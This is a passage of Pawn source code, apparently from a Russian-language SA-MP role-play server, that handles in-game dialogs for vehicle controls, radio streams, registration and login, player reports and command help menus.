                   		GetVehicleParamsEx(veh,engine,lights,alarm,doors,bonnet,boot,objective);
                     	SetVehicleParamsEx(veh,engine,lights,alarm,doors,bonnet,VEHICLE_PARAMS_ON,objective);
                      	SetPVarInt(playerid, "Boot", 1);
                   	}
                   	else if(GetPVarInt(playerid, "Boot") == 1)
                    {
                    	GetVehicleParamsEx(veh,engine,lights,alarm,doors,bonnet,boot,objective);
                     	SetVehicleParamsEx(veh,engine,lights,alarm,doors,bonnet,VEHICLE_PARAMS_OFF,objective);
                      	SetPVarInt(playerid, "Boot", 0);
                    }
                }
                case 2:
                {
                	if(GetPVarInt(playerid, "Alarm") == 0)
                 	{
                  		GetVehicleParamsEx(veh,engine,lights,alarm,doors,bonnet,boot,objective);
                    	SetVehicleParamsEx(veh,engine,lights,VEHICLE_PARAMS_ON,doors,bonnet,boot,objective);
                     	SetPVarInt(playerid, "Alarm", 1);
                   	}
                    else if(GetPVarInt(playerid, "Alarm") == 1)
                    {
                    	GetVehicleParamsEx(veh,engine,lights,alarm,doors,bonnet,boot,objective);
                     	SetVehicleParamsEx(veh,engine,lights,VEHICLE_PARAMS_OFF,doors,bonnet,boot,objective);
                      	SetPVarInt(playerid, "Alarm", 0);
                    }
                }
            }
            return 1;
        }
 	    case 9345:
		{
			if(!response) return 1;
			if(listitem == 5)
			{
				if(IsPlayerAttachedObjectSlotUsed(playerid, 3)) RemovePlayerAttachedObject(playerid, 3);
				StopAudioStreamForPlayer(playerid);
			}
			else
			{
				static const Radio_List[6][64] = {
				    "http://radio02-cn03.akadostream.ru:8108/shanson128.mp3",
				    "http://radio02-cn03.akadostream.ru:8112/nashe128.mp3",
				    "http://online.radiorecord.ru:8101/rr_128",
				    "http://radio.zaycev.fm:9002/ZaycevFM(128).m3u",
				    "http://radio.zaycev.fm:9002/ZaycevFM(128).m3u",
				    "http://radio.zaycev.fm:9002/rnb/ZaycevFM(128).m3u"
				};
				if(!(IsPlayerAttachedObjectSlotUsed(playerid, 3)))
				{
				    ApplyAnimation(playerid, "goggles", "goggles_put_on", 4.1, 0, 0, 0, 0, 0, 1);
					SetPlayerAttachedObject(playerid, 3, 19424, 2, 0.05, 0.0, 0.0, 90.0, 360.0, 270.0);
				}
				PlayAudioStreamForPlayer(playerid, Radio_List[listitem]);
			}
		}
		case 969:
		{
			if(!response) return 1;
			if(!b_Capture{listitem})
			{
				b_Capture{listitem} = 1;
				SendClientMessage(playerid, COLOR_RED, "Вы включили запрет на капт данной банде!");
			}
			else
			{
				b_Capture{listitem} = 0;
				SendClientMessage(playerid, COLOR_GREEN, "Вы отключили запрет на капт данной банде!");
			}
			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_GANG" SET bcapt_g=%d,bcapt_b=%d,bcapt_r=%d,bcapt_a=%d,bcapt_v=%d", b_Capture{0}, b_Capture{1}, b_Capture{2}, b_Capture{3}, b_Capture{4});
			mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
			ShowDialogGhetto(playerid);
			return 1;
		}
		/*case D_CANCELRENT:
	    {
	        if(!response) return 1;
	        SendClientMessage(playerid, COLOR_FADE1, "Вы отказались от аренды транспорта");
	        new rc = GetPVarInt(playerid, "arendkey");
			ArendInfo[rc][aPlayerID] = INVALID_PLAYER_ID;
			SetVehicleToRespawn(ArendInfo[rc][aID]);
			CarDoorsEx(ArendInfo[rc][aID], 0);
	    }*/
		case 1431:
		{
			if(response)
			{
				if(listitem < 3)
				{
					PI[playerid][pSkin][listitem] = PI[playerid][pModel];
					SendMes(playerid, COLOR_GREEN, "Вы выбрали %d полку для одежды. Переодеться можно дома (/hmenu)", listitem+1);
				}
				else SendClientMessage(playerid, COLOR_GREY, "Одежда будет на Вас");
			}
		}
		case 1212:
	    {
	        if(!response) return SendClientMessage(playerid, COLOR_GREY, "Шагай тогда отсюда и не возвращайся");
            if(!IsAGang(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Что-то ты не похож на своего. Забудь сюда дорогу! (( Вы должны состоять в банде, чтобы вырубить наркотики ))");
            SendClientMessage(playerid, COLOR_GREEN, "Отправляйся в соседнюю комнату, там ты найдёшь что ищешь.");
            SetPVarInt(playerid, "next_actor", 1);
		}
		case 1213:
		{
			if(!response) return 1;
			new maximum = strval(inputtext),newslot;
			if(!strlen(inputtext)) return ShowPlayerDialog(playerid,1213,DIALOG_STYLE_INPUT,"Покупка травы","{FFFFFF}Введите количество пакетиков которое Вы хотите купить.","Купить","Отмена");
			else if(PI[playerid][pCash] < maximum*40) return ShowPlayerDialog(playerid,1213,DIALOG_STYLE_INPUT,"Покупка травы","{FFFFFF}Введите количество пакетиков которое Вы хотите купить.\n\n{F04245}У Вас недостаточно денег!","Купить","Отмена");
			else if(maximum < 1 || maximum > 100) return ShowPlayerDialog(playerid,1213,DIALOG_STYLE_INPUT,"Покупка травы","{FFFFFF}Введите количество пакетиков которое Вы хотите купить.\n\n{F04245}Количество не должно превышать 100 грамм!","Купить","Отмена");
			if(CheckMaxVes(playerid,44,maximum,newslot)==1)return SendClientMessage(playerid,COLOR_GREY,"У Вас нет свободного места в инвентаре!");
			PlayerItem1[playerid][newslot]=44;
   			PlayerItem2[playerid][newslot]+=maximum;
			GiveMoney(playerid, -maximum*40);
			DeletePVar(playerid, "next_actor");
			SendClientMessage(playerid, COLOR_YELLOW, "Вот, держи свой товар! Заходи ещё, скоро будет увеличен ассортимент");
			SaveItem(playerid,newslot);
		}
  		case D_REGISTER:
	    {
	    	for(new i = strlen(inputtext); i != 0; --i)
	    	switch(inputtext[i])
			{
				case 'А'..'Я', 'а'..'я', ' ': //
				return SendClientMessage(playerid, COLOR_WHITE, "При вводе пароля используйте только английские буквы"), Kick(playerid);
			}
			if(response)
			{
   				if(!strlen(inputtext) || strlen(inputtext) < 6 || strlen(inputtext) > 16 || IsTextRussian(inputtext))
				{
				    ShowDialogRegisterPlayer(playerid);
		    	}
				else
				{
					strmid(PI[playerid][pPassword], inputtext, 0, strlen(inputtext), 32);

					ShowDialogMailPlayer(playerid);
				}
            }
            else { SendMess(playerid, MSG_PLAYER_NEED_TO_LOGGED); Kick(playerid); }
		}
		case D_LOGIN:
	    {
	        if(!response)
			{
				SendMess(playerid, MSG_PLAYER_NEED_TO_LOGGED);
				Kick(playerid);
			}
			for(new i = strlen(inputtext); i != 0; --i)
	    	switch(inputtext[i])
			{
				case 'А'..'Я', 'а'..'я', ' ':
				return ShowPlayerDialog(playerid,D_ERRORPAS,DIALOG_STYLE_MSGBOX,"Ошибка","{FFFFFF}Пароль не должен содержать запрещённые символы\nВозможно, Вы вводите пароль не в той раскладке","Повторить","");
			}
	        if(!strlen(inputtext))
			{
			    return ShowDialogAutorizationPlayer(playerid);
			}

			STRING_GLOBAL[0] = EOS;
			mysql_format(dbHandle, STRING_GLOBAL, sizeof(STRING_GLOBAL), "SELECT * FROM "T_ACCOUNTS" WHERE `name`='%e' AND `password`=MD5('%e') LIMIT 1", GetName(playerid), inputtext);
			mysql_tquery(dbHandle, STRING_GLOBAL, "OnPlayerLogin", "ds", playerid, inputtext);
		}
		case D_ERRORPAS:
		{
		    if(!response) { SendMess(playerid, MSG_PLAYER_NEED_TO_LOGGED); Kick(playerid); }

			ShowPlayerDialog
			(
				playerid, D_LOGIN, DIALOG_STYLE_INPUT,
				"{FFFFFF}Авторизация",
				"{FFFFFF}С возвращением на {37c268}HOME ONLINE\n\
				Неверно введён пароль от аккаунта\n\
				Убедитесь в верности Ваших данных и повторите попытку\n\n\
				{37c268}Введите пароль:",
				"Войти", "Отмена"
			);
		}
		case D_SEX:
		{
			if(response) PI[playerid][pSex] = 1;
			else PI[playerid][pSex] = 2;

			ClothesRound[playerid] = 1;
			PlayerRegistered[playerid] = 1;
			SendClientMessage(playerid, COLOR_LIME, "Выберите одежду для вашего будущего персонажа:");
			SetHealth(playerid, 100);
			SetHunger(playerid, 100);
			PlayerLogged[playerid] = true;
			TogglePlayerSpectating(playerid, false);
			SpawnPlayer(playerid);
		}
		case 13212:
		{
			if(!response) return 1;
			if(!strlen(inputtext)) return ShowPlayerDialog(playerid, 13212, DIALOG_STYLE_INPUT, "Репорт", "{FFFFFF}Введите ID игрока и причину подачи на него в репорт:", "Отправить","Назад");
			if(GetPVarInt(playerid,"AntiFloodRep") > gettime()) return SendClientMessage(playerid, COLOR_GREY, "На отправку репорта/вопроса существует лимит времени, пожалуйста подождите.");

			new string[128];
			format(string, sizeof(string), "{DB5622}%s[%d]: {ffd400}%s",PI[playerid][pName],playerid,inputtext);
			SendAdminMessage(0xDB5622FF, string);

			format(string, sizeof(string), "{35aa28}%s[%d]: {ffd400}%s", PI[playerid][pName], playerid, inputtext);
		    SendClientMessage(playerid, 0x35AA28FF, string);
			SendClientMessage(playerid, 0x35AA28FF, !"Ожидайте, в ближайшее время на Вашу жалобу отреагирует администратор.");

			if(PI[playerid][pVip]) SetPVarInt(playerid, "AntiFloodRep", gettime() + 15);
			else SetPVarInt(playerid, "AntiFloodRep", gettime() + 30);

			if(PI[playerid][pMuted] > 0) SetPVarInt(playerid, "AntiFloodRep", gettime() + 60);
		}
	case 13213:
		{
			if(!response) return 1;
			if(!strlen(inputtext)) return SPD(playerid, 13213, DIALOG_STYLE_INPUT, "{00BFFF}>> Задать вопрос", "{FFFFFF}Введите чётко поставленный вопрос:", "Отправить","Назад");
			if(GetPVarInt(playerid,"AntiFloodRep") > gettime()) return SCM(playerid, C_OSNOV, "На отправку репорта/вопроса существует лимит времени, пожалуйста подождите");
            else if(CheckReport(inputtext)) return BotReport(playerid);
			new fmt_str[128];
			format(fmt_str, sizeof(fmt_str), "{33AA33}[Репорт]: {FFFFFF}%s [%d] > {FFFFFF}%s. {FF0000}Дать ответ: {FFFFF}/ot",PI[playerid][pName], playerid, inputtext);
			SendAdminMessage(0x4582A1FF, fmt_str);

			SCM(playerid, COLOR_WHITE, "Вы отправили сообщение администрации и помощникам. Ожидайте ответа");

			SetPVarInt(playerid, "AntiFloodRep", gettime() + 60);
		}
		case 15144:
		{
		    if(response) return ShowPlayerStatsDialog(playerid, playerid);
		    else return 1;
		}
  case DIALOG_PLAYER_MENU:
		{
			if(!response) return 1;
   			switch(listitem + 1)
			{
				case 1: callcmd::stats(playerid);
				case 2: callcmd::help(playerid);
				case 3:
				{
				    STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "%s\n%s\n%s\n%s\n%s\n%s\n%s",
					(Settings[playerid][0] != 0) ? ("{0099FF}1. {FFFFFF}Отображать чат организации\t\t\t| {FF0000}-") : ("{0099FF}1. {FFFFFF}Отображать чат организации\t\t\t| {63BD4E}+"),
					(Settings[playerid][7] != 0) ? ("{0099FF}2. {FFFFFF}Отображать ники игроков\t\t\t\t| {FF0000}-") : ("{0099FF}2. {FFFFFF}Отображать ники игроков\t\t\t\t| {63BD4E}+"),
					(Settings[playerid][1] != 0) ? ("{0099FF}3. {FFFFFF}Отображать действия администрации\t\t| {FF0000}-") : ("{0099FF}3. {FFFFFF}Отображать действия администрации\t\t| {63BD4E}+"),
					(Settings[playerid][2] != 0) ? ("{0099FF}4. {FFFFFF}Отображать ID игроков в чате\t\t\t| {FF0000}-") : ("{0099FF}4. {FFFFFF}Отображать ID игроков в чате\t\t\t| {63BD4E}+"),
					(Settings[playerid][3] != 0) ? ("{0099FF}5. {FFFFFF}Отображать чемодан в руке игрока\t\t\t| {FF0000}-") : ("{0099FF}5. {FFFFFF}Отображать чемодан в руке игрока\t\t\t| {63BD4E}+"),
					(Settings[playerid][4] != 0) ? ("{0099FF}6. {FFFFFF}Отображать сытость игрока\t\t\t\t| {FF0000}-") : ("{0099FF}6. {FFFFFF}Отображать сытость игрока\t\t\t\t| {63BD4E}+"),
					(Settings[playerid][5] != 1) ? ("{0099FF}7. {FFFFFF}Отображать 3D номера на транспорте\t\t| {FF0000}-") : ("{0099FF}7. {FFFFFF}Отображать 3D номера на транспорте\t\t| {63BD4E}+"));
					ShowPlayerDialog(playerid, D_JOB+173, DIALOG_STYLE_LIST, "Настройки персонажа", STRING_GLOBAL, "Выбрать", "Назад");
				}
				case 4: PlayerSecurity(playerid);
				case 5: callcmd::report(playerid);
				case 6: ShowPlayerImproveDialog(playerid);
				case 7: callcmd::help(playerid);
				case 8: ShowPlayerDialog(playerid, D_JOB+20, 1, "Смена нонРП ника",
				"{FFFFFF}Введите будущий ник\n\n\
		   		{F04245}Возможно сменить только если у Вас нонРП ник!", "Принять", "Назад");
				case 9: callcmd::donate(playerid);
				case 10:
				{
					STRING_GLOBAL[0] = EOS;
					strcat(STRING_GLOBAL,"{FFFFFF}В данном окне, Вы сможете активировать промокод\n");
					strcat(STRING_GLOBAL,"Для использования промокода укажите его в поле ниже\n\n");
					strcat(STRING_GLOBAL,"{FFFFFF}Введите полученный промокод в окошко ниже:");
					ShowPlayerDialog(playerid, D_PROMO+5, DIALOG_STYLE_INPUT, "Активация промокода", STRING_GLOBAL, "Далее", "Отмена");
				}
			}
		}
		case D_COMMANDSERVER:
		{
			if(!response) return 1;
   			switch(listitem)
			{
				case 0:
				{
				    STRING_GLOBAL[0] = EOS;
				    strcat(STRING_GLOBAL, "{66CC00}/id {FFFFFF}- поиск игрока\n");
				    strcat(STRING_GLOBAL, "{66CC00}/time {FFFFFF}- посмотреть на часы\n");
				    strcat(STRING_GLOBAL, "{66CC00}/skill {FFFFFF}- показать свои навыки\n");
				    strcat(STRING_GLOBAL, "{66CC00}/setspawn {FFFFFF}- место спавна\n");
				    strcat(STRING_GLOBAL, "{66CC00}/smoke {FFFFFF}- курить\n");
				    strcat(STRING_GLOBAL, "{66CC00}/inv {FFFFFF}- использовать инвентарь\n");
				    strcat(STRING_GLOBAL, "{66CC00}/play {FFFFFF}- использовать mp3-плеер\n");
				    strcat(STRING_GLOBAL, "{66CC00}/healme {FFFFFF}- использовать аптечку\n");
        			strcat(STRING_GLOBAL, "{66CC00}/ad {FFFFFF}- подать объявление\n");
				    strcat(STRING_GLOBAL, "{66CC00}/pay {FFFFFF}- передать деньги\n");
				    strcat(STRING_GLOBAL, "{66CC00}/radio {FFFFFF}- переключить радиостанцию\n");
				    strcat(STRING_GLOBAL, "{66CC00}/gps {FFFFFF}- навигатор\n");
				    strcat(STRING_GLOBAL, "{66CC00}/leaders {FFFFFF}- лидеры в сети\n");
				    strcat(STRING_GLOBAL, "{66CC00}/pass {FFFFFF}- показать паспорт\n");
				    strcat(STRING_GLOBAL, "{66CC00}/lic {FFFFFF}- показать лицензии\n");
				    strcat(STRING_GLOBAL, "{66CC00}/med {FFFFFF}- показать мед. карту\n");
				    strcat(STRING_GLOBAL, "{66CC00}/diplom {FFFFFF}- показать диплом\n");
				    strcat(STRING_GLOBAL, "{66CC00}/togphone {FFFFFF}- вкл/выкл телефон\n");
				    strcat(STRING_GLOBAL, "{66CC00}/anim {FFFFFF}- список анимаций\n");
				    strcat(STRING_GLOBAL, "{66CC00}/usedrugs {FFFFFF}- использовать наркотик\n");
				    strcat(STRING_GLOBAL, "{66CC00}/phone {FFFFFF}- меню телефона\n");
				    strcat(STRING_GLOBAL, "{66CC00}/number {FFFFFF}- узнать номер игрока\n");
				    strcat(STRING_GLOBAL, "{66CC00}/charity {FFFFFF}- самые щедрые игроки\n");
				    strcat(STRING_GLOBAL, "{66CC00}/fstyle {FFFFFF}- изменить стиль боя\n");
				    strcat(STRING_GLOBAL, "{66CC00}/giveflowers {FFFFFF}- передать цветы\n");
				    strcat(STRING_GLOBAL, "{66CC00}/history {FFFFFF}- история ников\n");
				    strcat(STRING_GLOBAL, "{66CC00}/sellsim {FFFFFF}- продать SIM-карту\n");
				    strcat(STRING_GLOBAL, "{66CC00}/hi {FFFFFF}- пожать руку игроку\n");
				    strcat(STRING_GLOBAL, "{66CC00}/kiss {FFFFFF}- поцеловать игрока");
				    ShowPlayerDialog(playerid, D_COMMAND_SHOW, DIALOG_STYLE_MSGBOX, "Основные", STRING_GLOBAL, "Назад", "Закрыть");
				}
				case 1:
				{
				    STRING_GLOBAL[0] = EOS;
				    strcat(STRING_GLOBAL, "{66CC00}/me {FFFFFF}- действие от 1-го лица \n");
				    strcat(STRING_GLOBAL, "{66CC00}/ame {FFFFFF}- действие от 1-го лица (над головой)\n");
				    strcat(STRING_GLOBAL, "{66CC00}/do {FFFFFF}- действие от 3-го лица\n");
				    strcat(STRING_GLOBAL, "{66CC00}/try {FFFFFF}- попытка действия\n");
				    strcat(STRING_GLOBAL, "{66CC00}/s {FFFFFF}- крикнуть\n");
				    strcat(STRING_GLOBAL, "{66CC00}/w {FFFFFF}- сказать шёпотом\n");
				    strcat(STRING_GLOBAL, "{66CC00}/n {FFFFFF}- нонРП чат");
				    ShowPlayerDialog(playerid, D_COMMAND_SHOW, DIALOG_STYLE_MSGBOX, "Чат", STRING_GLOBAL, "Назад", "Закрыть");
				}
				case 2:
				{
				    if(!GetPlayerHouse(playerid)) return SendClientMessage(playerid, COLOR_GREY, "У Вас нет дома!");
				    STRING_GLOBAL[0] = EOS;
				    strcat(STRING_GLOBAL, "{66CC00}/hmenu {FFFFFF}- меню дома\n");
				    strcat(STRING_GLOBAL, "{66CC00}/healing {FFFFFF}- использовать домашнюю аптечку\n");
				    strcat(STRING_GLOBAL, "{66CC00}/hgps {FFFFFF}- отметить свой дом на GPS\n");
				    strcat(STRING_GLOBAL, "{66CC00}/changehouse {FFFFFF}- обменяться домами с игроком");
					strcat(STRING_GLOBAL, "{66CC00}/sellmyhouse {FFFFFF}- продать дом игроку");
				    ShowPlayerDialog(playerid, D_COMMAND_SHOW, DIALOG_STYLE_MSGBOX, "Дом", STRING_GLOBAL, "Назад", "Закрыть");
				}
				case 3:
				{
				    STRING_GLOBAL[0] = EOS;
				    strcat(STRING_GLOBAL, "{66CC00}/buybiz {FFFFFF}- приобрести бизнес\n");
				    strcat(STRING_GLOBAL, "{66CC00}/bpanel {FFFFFF}- меню бизнеса\n");
				    //strcat(STRING_GLOBAL, "{66CC00}/order {FFFFFF}- заказать товар\n");
				    //strcat(STRING_GLOBAL, "{66CC00}/fuel {FFFFFF}- заказать топливо\n");
				    strcat(STRING_GLOBAL, "{66CC00}/getbizstats {FFFFFF}- статистика бизнеса");
				    ShowPlayerDialog(playerid, D_COMMAND_SHOW, DIALOG_STYLE_MSGBOX, "Бизнес", STRING_GLOBAL, "Назад", "Закрыть");
				}
				case 4:
				{
				    STRING_GLOBAL[0] = EOS;
				    strcat(STRING_GLOBAL, "{66CC00}/sellmycar {FFFFFF}- обменять транспорт\n");
				    strcat(STRING_GLOBAL, "{66CC00}/sellcar {FFFFFF}- продать транспорт\n");
				    strcat(STRING_GLOBAL, "{66CC00}/eject {FFFFFF}- выкинуть из транспорта\n");
				    strcat(STRING_GLOBAL, "{66CC00}/lock {FFFFFF}- открыть/закрыть транспорт\n");
				    strcat(STRING_GLOBAL, "{66CC00}/givevkey {FFFFFF}- дать ключи от авто\n");
				    strcat(STRING_GLOBAL, "{66CC00}/takevkey {FFFFFF}- забрать ключи от авто\n");
				    strcat(STRING_GLOBAL, "{66CC00}/dropvkey {FFFFFF}- выкинуть ключи от авто\n");
				    strcat(STRING_GLOBAL, "{66CC00}/fuel {FFFFFF}- использовать канистру\n");
				    strcat(STRING_GLOBAL, "{66CC00}/tools {FFFFFF}- использовать инструменты\n");
				    strcat(STRING_GLOBAL, "{66CC00}/park {FFFFFF}- припарковать автомобиль\n");
				    strcat(STRING_GLOBAL, "{66CC00}/findcar {FFFFFF}- найти автомобиль по GPS\n");
				    strcat(STRING_GLOBAL, "{66CC00}/cars {FFFFFF}- загрузить/выгрузить автомобиль\n");
				    if(PI[playerid][pVip])
				    {
				    	strcat(STRING_GLOBAL, "{66CC00}/rtune {FFFFFF}- удалить тюнинг с транспорта");
			    	}
					strcat(STRING_GLOBAL, "{66CC00}/fixcopter {FFFFFF}- загрузить/выгрузить вертолет\n");
					strcat(STRING_GLOBAL, "{66CC00}/findcopter {FFFFFF}- найти вертолет\n");

				    ShowPlayerDialog(playerid, D_COMMAND_SHOW, DIALOG_STYLE_MSGBOX, "Транспорт", STRING_GLOBAL, "Назад", "Закрыть");
				}
				case 5:
				{
					if(PI[playerid][pJob] == 0) return SendClientMessage(playerid, COLOR_GREY, "Вы не работаете!");
					switch(PI[playerid][pJob])
					{
						case JOB_BUS:
						{
						    STRING_GLOBAL[0] = EOS;
						    strcat(STRING_GLOBAL, "{FFFFFF}Водитель автобуса:\n");
				    		strcat(STRING_GLOBAL, "{66CC00}/end {FFFFFF}- завершить рейс");
						}
						case JOB_TAXI:
						{
						    STRING_GLOBAL[0] = EOS;
						    strcat(STRING_GLOBAL, "{FFFFFF}Водитель такси:\n");
				    		strcat(STRING_GLOBAL, "{66CC00}/fare {FFFFFF}- начать работу");
						}
						case JOB_MECHANIC:
						{
						    STRING_GLOBAL[0] = EOS;
						    strcat(STRING_GLOBAL, "{FFFFFF}Автомеханик:\n");
				    		strcat(STRING_GLOBAL, "{66CC00}/repair {FFFFFF}- починить транспорт\n");
				    		strcat(STRING_GLOBAL, "{66CC00}/refill {FFFFFF}- заправить транспорт");
						}
						case JOB_TRUCK:
						{
						    STRING_GLOBAL[0] = EOS;
						    strcat(STRING_GLOBAL, "{FFFFFF}Дальнобойщик:\n");
				    		strcat(STRING_GLOBAL, "{66CC00}/rb {FFFFFF}- чат дальнобойщиков\n");
						}
					}
				    ShowPlayerDialog(playerid, D_COMMAND_SHOW, DIALOG_STYLE_MSGBOX, "По работе", STRING_GLOBAL, "Назад", "Закрыть");
				}
				case 6:
				{
				    if(PI[playerid][pRank] == 9) return SendClientMessage(playerid, COLOR_GREY, "Вы не лидер и его помощник(зам)!");

				    STRING_GLOBAL[0] = EOS;
				    strcat(STRING_GLOBAL, "{66CC00}/invite {FFFFFF}- принять игрока\n");
				    strcat(STRING_GLOBAL, "{66CC00}/uninvite {FFFFFF}- уволить игрока\n");
				    strcat(STRING_GLOBAL, "{66CC00}/giverank {FFFFFF}- изменить ранг\n");
				    strcat(STRING_GLOBAL, "{66CC00}/changeskin {FFFFFF}- выбрать служебную одежду\n");
				    strcat(STRING_GLOBAL, "{66CC00}/lpanel {FFFFFF}- меню лидера\n");
					strcat(STRING_GLOBAL, "{66CC00}/vigovor {FFFFFF} - выдать выговор\n");
					strcat(STRING_GLOBAL, "{66CC00}/blacklist {FFFFFF} - меню черного списка\n");
				    ShowPlayerDialog(playerid, D_COMMAND_SHOW, DIALOG_STYLE_MSGBOX, "Для лидеров", STRING_GLOBAL, "Назад", "Закрыть");
				}
				case 7:
				{
				    if(PI[playerid][pMember] == 0) return SendClientMessage(playerid, COLOR_GREY, "Вы не состоите в организации!");
				    if(IsAMayor(playerid))
				    {
				        STRING_GLOBAL[0] = EOS;
				        strcat(STRING_GLOBAL, "{66CC00}/r {FFFFFF}- рация\n");
				        strcat(STRING_GLOBAL, "{66CC00}/rn {FFFFFF}- NonRP чат фракции\n");
				    	strcat(STRING_GLOBAL, "{66CC00}/d {FFFFFF}- департамент\n");
				    	strcat(STRING_GLOBAL, "{66CC00}/dn {FFFFFF}- NonRP департамент\n");
				    	strcat(STRING_GLOBAL, "{66CC00}/gnews {FFFFFF}- гос. новости\n");
				    	strcat(STRING_GLOBAL, "{66CC00}/unarrest {FFFFFF}- выпустить игрока с тюрьмы(Адвокат)\n");
				    	strcat(STRING_GLOBAL, "{66CC00}/find {FFFFFF}- онлайн фракции");
				    }
					else if(PI[playerid][pMember] == TEAM_POLICIA || PI[playerid][pMember] == TEAM_POLICIA2 || PI[playerid][pMember] == TEAM_SWAT
					|| PI[playerid][pMember] == TEAM_FBI)
					{
					    STRING_GLOBAL[0] = EOS;
					    strcat(STRING_GLOBAL, "{66CC00}/r {FFFFFF}- рация\n");
					    strcat(STRING_GLOBAL, "{66CC00}/rn {FFFFFF}- NonRP чат фракции\n");
				    	strcat(STRING_GLOBAL, "{66CC00}/d {FFFFFF}- департамент\n");
				    	strcat(STRING_GLOBAL, "{66CC00}/dn {FFFFFF}- NonRP департамент\n");
				    	strcat(STRING_GLOBAL, "{66CC00}/gnews {FFFFFF}- гос. новости\n");
				    	strcat(STRING_GLOBAL, "{66CC00}/m {FFFFFF}- служебный мегафон\n");
				    	strcat(STRING_GLOBAL, "{66CC00}/frisk {FFFFFF}- обыскать\n");
				    	strcat(STRING_GLOBAL, "{66CC00}/takegun {FFFFFF}- изъять оружие\n");
				    	strcat(STRING_GLOBAL, "{66CC00}/take {FFFFFF}- изъять лицензии\n");
				    	strcat(STRING_GLOBAL, "{66CC00}/ticket {FFFFFF}- выписать штраф\n");
				    	strcat(STRING_GLOBAL, "{66CC00}/ram {FFFFFF}- взломать дверь дома\n");
				    	strcat(STRING_GLOBAL, "{66CC00}/break {FFFFFF}- дорожное ограждение\n");
				    	strcat(STRING_GLOBAL, "{66CC00}/push {FFFFFF}- затолкать в машину\n");
				    	strcat(STRING_GLOBAL, "{66CC00}/cuff {FFFFFF}- надеть наручники\n");
				    	strcat(STRING_GLOBAL, "{66CC00}/uncuff {FFFFFF}- снять наручники\n");
				    	strcat(STRING_GLOBAL, "{66CC00}/find {FFFFFF}- онлайн фракции\n");
				    	strcat(STRING_GLOBAL, "{66CC00}/clear {FFFFFF}- снять розыск\n");
				    	strcat(STRING_GLOBAL, "{66CC00}/wanted {FFFFFF}- список разыскиваемых\n");
				    	strcat(STRING_GLOBAL, "{66CC00}/su {FFFFFF}- подать в розыск\n");
				    	strcat(STRING_GLOBAL, "{66CC00}/flight {FFFFFF}- фонарик\n");
				    	strcat(STRING_GLOBAL, "{66CC00}/arrest {FFFFFF}- провести арест\n");
				    	strcat(STRING_GLOBAL, "{66CC00}/unmask {FFFFFF}- снять маску с игрока\n");
				    	strcat(STRING_GLOBAL, "{66CC00}/search {FFFFFF}- найти местоположение игрока\n");
						strcat(STRING_GLOBAL, "{66CC00}/listening {FFFFFF}- прослушивать органицию\n");
					}
					else if(PI[playerid][pMember] == TEAM_ARMIYA)
					{
					    STRING_GLOBAL[0] = EOS;
					    strcat(STRING_GLOBAL, "{66CC00}/r {FFFFFF}- рация\n");
					    strcat(STRING_GLOBAL, "{66CC00}/rn {FFFFFF}- NonRP чат фракции\n");
				    	strcat(STRING_GLOBAL, "{66CC00}/d {FFFFFF}- департамент\n");
				    	strcat(STRING_GLOBAL, "{66CC00}/dn {FFFFFF}- NonRP департамент\n");
				    	strcat(STRING_GLOBAL, "{66CC00}/gnews {FFFFFF}- гос. новости\n");
				    	strcat(STRING_GLOBAL, "{66CC00}/frisk {FFFFFF}- обыскать\n");
				    	strcat(STRING_GLOBAL, "{66CC00}/givevoen {FFFFFF}- выдать военный билет\n");
				    	strcat(STRING_GLOBAL, "{66CC00}/find {FFFFFF}- онлайн фракции\n");
				    	strcat(STRING_GLOBAL, "{66CC00}/loadgun {FFFFFF}- загрузка боеоприпасов\n");
				    	strcat(STRING_GLOBAL, "{66CC00}/unloadgun {FFFFFF}- разагрузка боеоприпасов\n");
					}
					else if(PI[playerid][pMember] == TEAM_AUTOSCHOOL)
					{
					    STRING_GLOBAL[0] = EOS;
					    strcat(STRING_GLOBAL, "{66CC00}/r {FFFFFF}- рация\n");
					    strcat(STRING_GLOBAL, "{66CC00}/rn {FFFFFF}- NonRP чат фракции\n");
				    	strcat(STRING_GLOBAL, "{66CC00}/d {FFFFFF}- департамент\n");
				    	strcat(STRING_GLOBAL, "{66CC00}/dn {FFFFFF}- NonRP департамент\n");
				    	strcat(STRING_GLOBAL, "{66CC00}/gnews {FFFFFF}- гос. новости\n");
				    	strcat(STRING_GLOBAL, "{66CC00}/salelic {FFFFFF}- продать лицензию\n");
				    	strcat(STRING_GLOBAL, "{66CC00}/find {FFFFFF}- онлайн фракции");
					}
					else if(IsANews(playerid))
					{
					    STRING_GLOBAL[0] = EOS;
					    strcat(STRING_GLOBAL, "{66CC00}/r {FFFFFF}- чат фракции\n");
					    strcat(STRING_GLOBAL, "{66CC00}/rn {FFFFFF}- NonRP чат фракции\n");
				    	strcat(STRING_GLOBAL, "{66CC00}/news {FFFFFF}- меню объявлений\n");
				    	strcat(STRING_GLOBAL, "{66CC00}/npanel {FFFFFF}- цены на sms и объявления\n");
				    	strcat(STRING_GLOBAL, "{66CC00}/find {FFFFFF}- онлайн фракции\n");
				    	if(PI[playerid][pRank] >= 9) strcat(STRING_GLOBAL, "{66CC00}/nbank {FFFFFF}- сейф организации");
					}
					else if(IsAMedic(playerid))
					{
					    STRING_GLOBAL[0] = EOS;
					    strcat(STRING_GLOBAL, "{66CC00}/r {FFFFFF}- чат фракции\n");
					    strcat(STRING_GLOBAL, "{66CC00}/rn {FFFFFF}- NonRP чат фракции\n");
					    strcat(STRING_GLOBAL, "{66CC00}/d {FFFFFF}- департамент\n");
					    strcat(STRING_GLOBAL, "{66CC00}/dn {FFFFFF}- NonRP департамент\n");
				    	strcat(STRING_GLOBAL, "{66CC00}/heal {FFFFFF}- провести лечение\n");
				    	strcat(STRING_GLOBAL, "{66CC00}/find {FFFFFF}- онлайн фракции\n");
				    	if(PI[playerid][pRank] > 3) strcat(STRING_GLOBAL, "{FFFF00}/givemed {FFFFFF}- выдать мед. карту");
					}
					else if(IsAGang(playerid))
					{
					    STRING_GLOBAL[0] = EOS;
					    strcat(STRING_GLOBAL, "{66CC00}/f {FFFFFF}- чат фракции\n");
					    strcat(STRING_GLOBAL, "{66CC00}/fn {FFFFFF}- NonRP чат фракции\n");
				    	strcat(STRING_GLOBAL, "{66CC00}/find {FFFFFF}- онлайн фракции\n");
				    	if(PI[playerid][pRank] >= 9) strcat(STRING_GLOBAL, "{66CC00}/close {FFFFFF}- открыть/закрыть склад");
